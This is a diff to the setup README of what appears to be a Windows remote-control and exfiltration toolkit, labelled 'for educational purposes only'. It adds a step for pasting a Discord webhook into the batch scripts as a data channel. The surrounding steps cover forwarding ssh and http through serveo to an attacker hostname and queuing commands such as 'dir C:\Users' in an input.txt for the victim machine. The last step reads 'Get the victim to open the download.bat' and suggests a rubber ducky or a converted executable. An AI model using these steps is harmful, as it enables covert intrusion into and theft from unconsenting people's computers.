@@ -35,11 +35,13 @@ For educational purposes only.
 
 6. Adapt Setup.bat and scheduled.bat to match your chosen hostname / your public IP
 
-7. Start serveo (or a different port forwarding service)
+7. Create a discord webhook in a channel on a server and paste the URL into Setup.bat and scheduled.bat.
+
+8. Start serveo (or a different port forwarding service)
     - See the launch_serveo.txt file for 2 commands to forward ssh and http to your_hostname.serveo.net
     - You can use screen to start multiple serveo forwarding simultaneously
 
-8. Create folders and the input.txt
+9. Create folders and the input.txt
     ```
     touch /var/www/html/input.txt
     echo "dir C:\Users" >> /var/www/html/input.txt
@@ -49,5 +51,5 @@ For educational purposes only.
     sudo chmod 777 /mnt/income
     ```
 
-9. Get the victim to open the download.bat
+10. Get the victim to open the download.bat
     - That's your part. There are many options: Using a rubberducky script or converting the bat file into an executable.
